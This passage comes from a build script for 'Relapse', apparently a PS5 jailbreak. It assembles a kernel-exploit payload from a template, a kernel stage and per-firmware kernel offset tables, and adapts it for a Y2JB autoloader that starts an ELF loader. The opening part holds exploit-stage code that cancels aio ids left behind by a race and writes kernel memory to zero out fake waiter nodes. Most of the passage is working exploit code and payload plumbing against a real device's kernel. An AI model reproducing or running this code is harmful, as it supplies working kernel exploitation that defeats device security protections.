      this.report(label, "verify failed: " + e.message);
    }
  }

  // Build E: cancel every aio id the race left behind through the kernel's own
  // teardown, then let the caller re-dump the id table to show which slots
  // actually went free. If the exit path panics because it frees objects the
  // race already freed, cancelling them here leaves it nothing to double-free.
  async cancelAllAio(label) {
    try {
      const ids = [];
      for (const g of this.armedGroups) for (const id of g) ids.push(id);
      const parked = (this.parkedIds || []).slice();
      for (const id of parked) ids.push(id);
      if (!ids.length) {
        this.report(label, "no ids recorded - nothing to cancel");
        return;
      }
      const buf = this.alloc(4 * ids.length);
      const states = this.alloc(4 * ids.length);
      for (let i = 0; i < ids.length; i++) this.writeU32(buf, i * 4, ids[i]);
      const rv = await this.sysInt(SYS_AIO_MULTI_CANCEL, buf, ids.length, states);
      const tally = {};
      for (let i = 0; i < ids.length; i++) {
        const k = "state " + (this.readU32(states, i * 4) & 0xffff);
        tally[k] = (tally[k] || 0) + 1;
      }
      this.report(label, "cancelled " + ids.length + " ids (" +
        (ids.length - parked.length) + " armed, " + parked.length +
        " parked), syscall returned " + rv + ": " +
        Object.keys(tally).map((k) => k + " x" + tally[k]).join(", "));
      await sleep(300);
    } catch (e) {
      this.report(label, "cancel failed: " + e.message);
    }
  }

  // Build B: zero the fake waiter nodes in place. A node is ours as long as
  // +0x10 still holds the nodeMutex address buildWaiterNodes() stamped there;
  // the first node that fails that test ends the walk, so a recycled array is
  // left alone instead of being zeroed over somebody else's live object.
  async scrubAioPoison(label) {
    const H = (v) => (v === null ? "-" : "0x" + v.toString());
    try {
      const recs = this.poisonWaiters || [];
      if (!recs.length) {
        this.report(label, "no waiter arrays were recorded - nothing to scrub " +
          "(needs AIO_POISON_SNAPSHOT)");
        return;
      }
      const nodeMutex = this.kaddr(this.off.nodeMutex);
      const requestSize = this.off.aio.requestSize;
      let arrays = 0, nodes = 0, leftAlone = 0, failed = 0;
      for (const rec of recs) {
        let touched = 0;
        for (let n = 0; n < 64; n++) {
          const base = rec.addr.add32(n * requestSize);
          const mutex = await this.fptr(base.add32(0x10));
          if (!mutex || mutex.toString() !== nodeMutex.toString()) break;
          let ok = true;
          for (let off = 0; off < requestSize; off += 8)
            if (!(await this.writeKernel64(base.add32(off), 0, 0))) { ok = false; break; }
          if (!ok) { failed++; break; }
          touched++;
        }
        if (touched) { arrays++; nodes += touched; } else leftAlone++;
        this.report(label, "array " + H(rec.addr) + " (id " + rec.id + "): zeroed " +
          touched + " node(s) of 0x" + requestSize.toString(16) + " bytes" +
          (touched ? "" : " - +0x10 no longer holds nodeMutex, left alone"));
      }
      this.report(label, "scrubbed " + nodes + " nodes across " + arrays +
        " arrays (" + leftAlone + " left alone, " + failed + " write failures)");
      const back = [];
      for (let off = 0; off < requestSize; off += 8) {
        const w = await this.readKernel64(recs[0].addr.add32(off));
        back.push("+" + off.toString(16) + "=" + (w === null ? "?" : "0x" + w.toString()));
      }
      this.report(label, "readback " + H(recs[0].addr) + " " + back.join(" "));
    } catch (e) {
      this.report(label, "scrub failed: " + e.message);
    }
  }

  async restorePipes() {`,
  "aio poison snapshot",
);
}

// edit 11/12 is cosmetic: indent to sit inside the payload IIFE
stage = stage
  .split("\n")
  .map((line) => (line.length ? "        " + line : line))
  .join("\n");

// ---------------------------------------------------------------------------
// 2. offsets
// ---------------------------------------------------------------------------
const keyNeedsQuotes = (k) => !/^[A-Za-z_$][A-Za-z0-9_$]*$/.test(k);

function fmt(value, indent) {
  if (typeof value === "number")
    return Number.isInteger(value) && value >= 0 ? "0x" + value.toString(16) : String(value);
  if (typeof value === "string") return JSON.stringify(value);
  if (Array.isArray(value)) return "[" + value.map((v) => fmt(v, indent)).join(", ") + "]";
  if (value && typeof value === "object") {
    const inner = indent + "    ";
    const body = Object.entries(value)
      .map(([k, v]) => `${keyNeedsQuotes(k) ? JSON.stringify(k) : k}: ${fmt(v, inner)}`)
      .join(",\n" + inner);
    return "{\n" + inner + body + ",\n" + indent + "}";
  }
  throw new Error("cannot serialize " + typeof value);
}

const files = fs.readdirSync(offsetsDir).filter((f) => f.endsWith(".js"));
must(files.length > 0, "no offset files in " + offsetsDir);

const table = {};
for (const file of files) {
  const fw = path.basename(file, ".js");
  const src = fs.readFileSync(path.join(offsetsDir, file), "utf8");
  const sandbox = { window: {}, navigator: { userAgent: "" } };
  new Function("window", "navigator", "globalThis", "self", src)(
    sandbox.window,
    sandbox.navigator,
    sandbox,
    sandbox,
  );
  must(sandbox.window.KRW, file + " did not define window.KRW");
  must(
    sandbox.window.KRW.firmware === fw,
    file + ": firmware field is " + sandbox.window.KRW.firmware,
  );
  table[fw] = sandbox.window.KRW;
}

// --fw keeps only the named tables. The full set is 33 firmwares and ~200 KB of
// the payload, which matters because the loader caps the script at 0x40000:
// a hardware experiment only ever targets one console, and the instrumentation
// builds need the headroom.
if (fwFilter) {
  for (const fw of fwFilter)
    must(table[fw], "--fw " + fw + ": no offset table (available: " +
      Object.keys(table).sort((a, b) => a.localeCompare(b, undefined, { numeric: true })).join(", ") + ")");
  for (const fw of Object.keys(table))
    if (!fwFilter.includes(fw)) delete table[fw];
}

const order = Object.keys(table).sort((a, b) => {
  const [am, an] = a.split(".").map(Number);
  const [bm, bn] = b.split(".").map(Number);
  return am - bm || an - bn;
});

const tableText =
  `// Generated from ${order.length} of ${files.length} Relapse offset files ` +
  `(${order[0]} - ${order[order.length - 1]}).\n` +
  `        const KRW_TABLE = {\n` +
  order
    .map((fw) => `            ${JSON.stringify(fw)}: ${fmt(table[fw], "            ")},`)
    .join("\n") +
  `\n        };`;

// ---------------------------------------------------------------------------
// 3. assemble
// ---------------------------------------------------------------------------
let out = template;
must(out.includes("//__KRW_TABLE__"), "template lost the KRW marker");
must(out.includes("//__KERNEL_EXPLOIT__"), "template lost the kernel-stage marker");
out = out.replace("//__KRW_TABLE__", () => tableText);
out = out.replace("//__KERNEL_EXPLOIT__", () => stage.trimEnd());
out = out.replace(
  " * Generated file - do not edit directly.",
  " * Generated by tools/build.mjs - do not edit this file directly.",
);

// --target autoloader: turn the self-running IIFE into the start_relapse()
// entry point ps5-y2jb-autoloader's main.js expects. Every edit is matched
// against exact text so a template change fails the build instead of silently
// producing a payload that never runs, or that reports success when it did not.
if (target === "autoloader") {
  out = replaceOnce(out, "(async function () {", "async function start_relapse() {");
  must(/\}\)\(\);\s*$/.test(out), "template no longer ends with the IIFE call");
  out = out.replace(/\}\)\(\);\s*$/, "}\n");

  // main.js does `exploit_success = await start_relapse()` and kills YouTube on
  // a falsy result, so the three exits have to state their outcome: the early
  // `return;`s would otherwise fall out as undefined, which reads as failure
  // even on the two paths where the console is fine.
  out = replaceOnce(out,
    '        send_notification("relapse complete\\nelfldr on <ps5-ip>:9021");',
    '        send_notification("relapse complete\\nelfldr on <ps5-ip>:9021");');
  // The return goes after the EXIT_TEST block, not right after the notification.
  // Putting it here made the exit test unreachable: a --diag --set EXIT_TEST build
  // for this target would report success without ever running the test it was built
  // to run.
  out = replaceOnce(out,
    '                "(kill " + EXIT_TEST + " did not take effect)");\n        }',
    '                "(kill " + EXIT_TEST + " did not take effect)");\n        }\n\n        return true;');
  out = replaceOnce(out,
    '        try { send_notification("relapse FAILED: " + e.message); } catch (_) { }',
    '        try { send_notification("relapse FAILED: " + e.message); } catch (_) { }\n' +
    "        return false;");
  // Already jailbroken is the state main.js wants to reach, not an error: it
  // checks is_jailbroken() itself and then goes on to the autoload stage.
  out = replaceOnce(out,
    '            say("already jailbroken - nothing to do");\n            return;',
    '            say("already jailbroken - nothing to do");\n            return true;');
  out = replaceOnce(out,
    '                say("fail marker present (" + present[0] + ") - reboot before retrying");\n' +
    "                return;",
    '                say("fail marker present (" + present[0] + ") - reboot before retrying");\n' +
    "                return false;");

  // The autoloader knows the exact filenames it packaged (the Makefile seds
  // @@KEXP_FILE@@/@@ELFLDR_FILE@@ into aioshellcode.js). Prefer those, and keep
  // the Y2JB names plus the directory-pattern fallback for a hand-built package.
  out = replaceOnce(out,
    '        const KEXP_BIN_NAMES = ["kexp_2026_05_25.bin", "kexp.bin"];',
    "        const KEXP_BIN_NAMES = host_names(BIN_NAME).concat(\n" +
    '            ["kexp_2026_05_25.bin", "kexp.bin"]);');
  out = replaceOnce(out,
    '        const ELFLDR_NAMES = ["elfldr-ps5-1360.elf", "elfldr-ps5-0.23.elf",\n' +
    '            "elfldr_1320_v5.elf", "elfldr.elf"];',
    "        const ELFLDR_NAMES = host_names(ELFLDR_NAME).concat(\n" +
    '            ["elfldr-ps5-1360.elf", "elfldr-ps5-0.23.elf",\n' +
    '                "elfldr_1320_v5.elf", "elfldr.elf"]);');
  // host_names takes the value, not a name. aioshellcode.js declares BIN_NAME and
  // ELFLDR_NAME with a top-level `let`, which in a classic script is a global
  // *lexical* binding and not a property of globalThis - so globalThis["BIN_NAME"]
  // is undefined and the packaged filenames would never be seen, leaving the
  // hardcoded fallbacks to fail against a name the package actually shipped.
  // A bare identifier reference does see it, and typeof keeps a standalone build
  // (where the name is not declared at all) from throwing.
  out = replaceOnce(out,
    "        const CACHE_SUBDIR =",
    "        function host_names(value) {\n" +
    "            if (typeof value === \"string\" && value && !value.startsWith(\"@@\"))\n" +
    "                return [value];\n" +
    "            return [];\n" +
    "        }\n\n" +
    "        const CACHE_SUBDIR =");

  // On-screen banner: name the autoloader build rather than bare Y2JB.
  out = replaceOnce(out,
    '            (typeof version_string === "string" ? version_string : "Y2JB"));',
    '            (typeof version_string === "string" ? version_string\n' +
    '                : typeof autoloader_version === "string"\n' +
    '                    ? "autoloader " + autoloader_version : "Y2JB"));');
}

function stripComments(src) {
  const kept = [];
  let inBlock = false;
  for (const line of src.split("\n")) {
    const t = line.trim();
    if (inBlock) { if (t.includes("*/")) inBlock = false; continue; }
    if (t.startsWith("/*")) { if (!t.includes("*/")) inBlock = true; continue; }
    if (t.startsWith("//") || t.length === 0) continue;
    kept.push(line);
  }
  return kept.join("\n");
}

// Only the y2jb target goes through the remote JS loader's 0x40000 read; the
// autoloader serves the file to a <script> tag from its own update package.
const MAX_PAYLOAD = 0x40000;
if (strip) out = stripComments(out);
const bytes = Buffer.byteLength(out, "utf8");
if (target === "y2jb") {
  must(bytes <= MAX_PAYLOAD,
    "payload is " + bytes + " bytes but the Y2JB remote-JS loader only reads " +
    "0x40000 (" + MAX_PAYLOAD + "); a longer script arrives truncated and the " +
    'console reports "SyntaxError: Unexpected end of input"');
  if (bytes > MAX_PAYLOAD - 4096)
    console.log("build.mjs: warning - only " + (MAX_PAYLOAD - bytes) +
      " bytes of loader headroom left");
}

fs.writeFileSync(path.isAbsolute(outFile) ? outFile : path.join(root, outFile), out);
console.log(
  `${outFile}: ${bytes} bytes, ${out.split("\n").length} lines, ` +
    `${order.length} firmwares (${order[0]}-${order[order.length - 1]}), ` +
    `kernel stage ${stage.split("\n").length} lines, target ${target}` +
    (target === "autoloader" ? " (start_relapse)" : ""),
);
